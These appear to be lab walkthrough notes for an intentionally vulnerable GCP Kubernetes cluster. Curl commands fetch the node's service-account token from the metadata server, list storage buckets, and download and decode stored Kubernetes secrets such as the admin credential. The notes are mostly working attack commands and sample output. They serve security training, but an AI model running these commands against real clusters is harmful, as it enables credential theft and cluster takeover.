
Use Jay's GCP-based Kubernetes cluster by sshing into bustakube_mt@bustakubegcp, then running curl commands to find the kubelet token and key.

Start by using this to learn what GCP bucket the initial kube_env.yaml-type script is there:

 curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/0.1/meta-data/attributes/startup-script'

Go investigate that bucket named there.






Get a list of service account secrets from here:

# Get the GCP service account list and the default GCP token and parse it out to a bearertoken file
curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts'
curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'
curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' | awk -F\" '{print $4}' >bearertoken

# Get the project ID
curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id' >projectid

# Find the secrets directory 

# Get a list of buckets
curl -s -H 'Metadata-Flavor: Google' -H "Authorization: Bearer $(cat bearertoken)" -H "Accept: json" https://www.googleapis.com/storage/v1/b/?project=$(cat projectid) 

# Get the contents of a bucket
curl -s -H 'Metadata-Flavor: Google' -H "Authorization: Bearer $(cat bearertoken)" -H "Accept: json" https://www.googleapis.com/storage/v1/b/BUCKET/o | grep name
# Get the contents of a bucket and grep for name then for secrets
curl -s -H 'Metadata-Flavor: Google' -H "Authorization: Bearer $(cat bearertoken)" -H "Accept: json" https://www.googleapis.com/storage/v1/b/$(cat bucket.txt)/o | grep name | grep secrets

# output looks like: 
   "name": "multitenant.k8s.local/secrets/admin",
   "name": "multitenant.k8s.local/secrets/kube",
   "name": "multitenant.k8s.local/secrets/kube-proxy",
   "name": "multitenant.k8s.local/secrets/kubelet",
   "name": "multitenant.k8s.local/secrets/system:controller_manager",
   "name": "multitenant.k8s.local/secrets/system:dns",
   "name": "multitenant.k8s.local/secrets/system:logging",
   "name": "multitenant.k8s.local/secrets/system:monitoring",
   "name": "multitenant.k8s.local/secrets/system:scheduler",

# Grab one of these, URL encoding the name

curl -s -H 'Metadata-Flavor: Google' -H "Authorization: Bearer $(cat bearertoken)" -H "Accept: json" https://www.googleapis.com/storage/v1/b/BUCKET/o/OBJECT?alt=media >admin

# Output looks like 
{"Data":"SjRyN2x4dlo1c1JYZDBtVVcwME1kUUU0c3N0bmZETUM="}

# Base64 decode the item after in field[3] (fourth field)


Buckets/kubernetes-clusters-mt/multitenant.k8s.local/secrets

Try the one called admin!!!


 